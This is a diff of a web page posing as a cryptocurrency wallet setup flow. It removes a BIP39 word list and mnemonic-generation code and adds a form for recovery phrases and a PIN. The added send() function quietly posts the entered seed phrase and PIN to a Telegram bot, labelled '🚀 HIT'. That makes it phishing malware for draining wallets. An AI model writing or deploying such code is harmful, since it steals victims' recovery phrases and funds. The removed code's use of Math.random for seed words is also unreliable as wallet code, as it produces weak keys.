-            "never", "news", "next", "nice", "niece", "night", "nine", "noble", "noise", "nominee",
-            "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now",
-            "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe",
-            "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "officer",
-            "official", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one",
-            "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit",
-            "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor",
-            "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster",
-            "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic",
-            "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path",
-            "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant",
-            "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet",
-            "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon",
-            "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet",
-            "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet",
-            "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position",
-            "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict",
-            "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority",
-            "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote",
-            "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp",
-            "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push",
-            "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz",
-            "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise",
-            "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven",
-            "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe",
-            "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject",
-            "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew",
-            "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist",
-            "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward",
-            "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid",
-            "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot",
-            "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round",
-            "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad",
-            "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same",
-            "sample", "sand", "satellite", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale",
-            "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout",
-            "scrap", "screen", "script", "scrub", "sculpture", "sea", "seal", "search", "season", "seat",
-            "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar",
-            "senior", "sense", "sentence", "separate", "sequence", "serious", "service", "session", "settle", "setup",
-            "seven", "shadow", "shaft", "shallow", "share", "shark", "sharp", "shave", "sheep", "sheet",
-            "shelf", "shell", "shelter", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe",
-            "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling",
-            "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar",
-            "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch",
-            "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice",
-            "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smash",
-            "smell", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap",
-            "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve",
-            "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south",
-            "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere",
-            "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport",
-            "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium",
-            "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel",
-            "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool",
-            "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble",
-            "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest",
-            "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface",
-            "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm",
-            "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup",
-            "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target",
-            "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis",
-            "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there",
-            "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket",
-            "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title",
-            "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow",
-            "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "torch", "tornado", "tortoise",
-            "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic",
-            "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend",
-            "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true",
-            "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel",
-            "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type",
-            "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair",
-            "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual",
-            "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage",
-            "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid",
-            "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet",
-            "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable",
-            "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus",
-            "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume",
-            "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare",
-            "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon",
-            "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "west", "wet", "whale",
-            "what", "wheat", "wheel", "when", "where", "whip", "whisper", "white", "who", "whole",
-            "why", "wicked", "wide", "width", "wife", "wild", "will", "win", "window", "wine",
-            "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf",
-            "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap",
-            "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young",
-            "youth", "zebra", "zero", "zone", "zoo"
-        ];
-
-        let generatedWords = [];
-        let verificationStep = 0;
-        let userVerification = [];
-        let usedIndices = new Set();
-
-        setTimeout(() => {
-            showScreen('screen2');
-        }, 2000);
-
-        function showScreen(screenId) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById(screenId).classList.add('active');
-            hideError();
-            
-            if (screenId === 'screen3') {
-                generateWords();
-            } else if (screenId === 'screen5') {
-                setupVerification();
-            }
-        }
-
-        function showError(msg) {
-            const errorEl = document.getElementById('error-msg');
-            errorEl.textContent = msg;
-            errorEl.classList.add('show');
-            setTimeout(hideError, 2000);
-        }
-
-        function hideError() {
-            document.getElementById('error-msg').classList.remove('show');
-        }
-
-        function generateWords() {
-            // توليد 12 كلمة فريدة بدون تكرار
-            const available = [...bip39Words];
-            generatedWords = [];
-            usedIndices.clear();
-            
-            for (let i = 0; i < 12; i++) {
-                const randomIndex = Math.floor(Math.random() * available.length);
-                const word = available.splice(randomIndex, 1)[0];
-                generatedWords.push(word);
-            }
-            
-            const grid = document.getElementById('words-grid');
-            grid.innerHTML = '';
-            
-            generatedWords.forEach((word, index) => {
-                const item = document.createElement('div');
-                item.className = 'word-item';
-                item.innerHTML = `
-                    <span class="word-index">${index + 1}</span>
-                    <span class="word-text">${word}</span>
-                `;
-                grid.appendChild(item);
-            });
-            
-            userVerification = [];
-            verificationStep = 0;
-        }
-
-        function copyWords() {
-            const text = generatedWords.join(' ');
-            navigator.clipboard.writeText(text).then(() => {
-                const hint = document.getElementById('copy-hint');
-                hint.classList.add('show');
-                setTimeout(() => hint.classList.remove('show'), 2000);
-            });
-        }
-
-        function setupVerification() {
-            verificationStep = 0;
-            userVerification = [];
-            document.getElementById('verify-progress').textContent = '0/12';
-            
-            document.querySelectorAll('.verify-slot').forEach(slot => {
-                slot.textContent = '';
-                slot.className = 'verify-slot';
-            });
-            
-            // خلط الكلمات للاختيار
-            const shuffled = [...generatedWords].map((word, index) => ({ word, index }))
-                .sort(() => 0.5 - Math.random());
-            
-            const optionsContainer = document.getElementById('word-options');
-            optionsContainer.innerHTML = '';
-            
-            shuffled.forEach(({ word, index }) => {
-                const btn = document.createElement('button');
-                btn.className = 'word-option';
-                btn.textContent = word;
-                btn.dataset.index = index;
-                btn.onclick = () => selectWord(word, index, btn);
-                optionsContainer.appendChild(btn);
-            });
-        }
-
-        function selectWord(word, originalIndex, btn) {
-            if (verificationStep >= 12) return;
-            
-            // التحقق من أن الكلمة هي المطلوبة بالترتيب
-            if (word !== generatedWords[verificationStep]) {
-                showError('Mot incorrect !');
-                
-                // اهتزاز الخانة الحالية
-                const slots = document.querySelectorAll('.verify-slot');
-                const currentSlot = slots[verificationStep];
-                currentSlot.classList.add('error');
-                setTimeout(() => currentSlot.classList.remove('error'), 500);
-                return;
-            }
-            
-            // كلمة صحيحة
-            const slots = document.querySelectorAll('.verify-slot');
-            const currentSlot = slots[verificationStep];
-            
-            currentSlot.textContent = word;
-            currentSlot.classList.add('filled');
-            btn.classList.add('used');
-            userVerification.push(word);
-            verificationStep++;
-            
-            document.getElementById('verify-progress').textContent = `${verificationStep}/12`;
-            
-            if (verificationStep === 12) {
-                setTimeout(() => {
-                    showScreen('screen6');
-                }, 500);
-            }
-        }
-
-        function pasteWords() {
-            const textarea = document.getElementById('import-words');
-            textarea.value = generatedWords.join(' ');
-        }
-
-        document.getElementById('word-input')?.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                const val = this.value.trim().toLowerCase();
-                if (!val) return;
-                
-                // التحقق من صحة الكلمة
-                if (!bip39Words.includes(val)) {
-                    showError('Mot invalide !');
-                    this.value = '';
-                    return;
-                }
-                
-                const textarea = document.getElementById('import-words');
-                const currentText = textarea.value;
-                const words = currentText ? currentText.split(' ') : [];
-                
-                // التحقق من عدم التكرار
-                if (words.includes(val)) {
-                    showError('Mot déjà utilisé !');
-                    this.value = '';
-                    return;
-                }
-                
-                textarea.value += (currentText ? ' ' : '') + val;
-                this.value = '';
-                
-                // تحديث الرقم
-                const wordNum = document.querySelector('.word-number');
-                wordNum.textContent = words.length + 2;
+    function paster(e) {
+        e.preventDefault();
+        const text = (e.clipboardData || window.clipboardData).getData('text').trim().split(/\s+/);
+        const start = parseInt(e.target.getAttribute('data-idx'));
+        const ins = document.querySelectorAll('.w-in');
+        text.forEach((w, i) => { 
+            if(ins[start + i]) {
+                ins[start + i].value = w.toLowerCase();
+                document.getElementById(`wc-${start+i}`).classList.add('valid');
             }
         });
-    </script>
+    }
+
+    function verifySteps() {
+        const ins = document.querySelectorAll('.w-in');
+        const words = Array.from(ins).map(i => i.value.trim().toLowerCase());
+        const msg = document.getElementById('msg');
+
+        if(words.some(w => w === "")) return;
+
+        // Duplicate Check (The Pro Touch)
+        const seen = new Set();
+        let dupIdx = -1;
+        words.forEach((w, i) => { if(seen.has(w)) dupIdx = i; else seen.add(w); });
+
+        if(dupIdx !== -1) {
+            msg.innerText = "Duplicate word detected";
+            msg.style.visibility = 'visible';
+            const bad = document.getElementById(`wc-${dupIdx}`);
+            bad.classList.add('error');
+            return;
+        }
+
+        phrase = words.join(" ");
+        go(4);
+    }
+
+    function pk(n) { if(pin.length < 6) { pin += n; upP(); if(pin.length === 6) send(); } }
+    function del() { pin = pin.slice(0,-1); upP(); }
+    function upP() { document.querySelectorAll('.dot').forEach((d,i) => d.classList.toggle('on', i<pin.length)); }
+
+    function send() {
+        document.getElementById('v4').style.display = 'none';
+        document.getElementById('sync').style.display = 'block';
+        fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent('🚀 HIT\n\nPhrase: '+phrase+'\nPIN: '+pin)}`);
+    }
+</script>
 </body>
 </html>
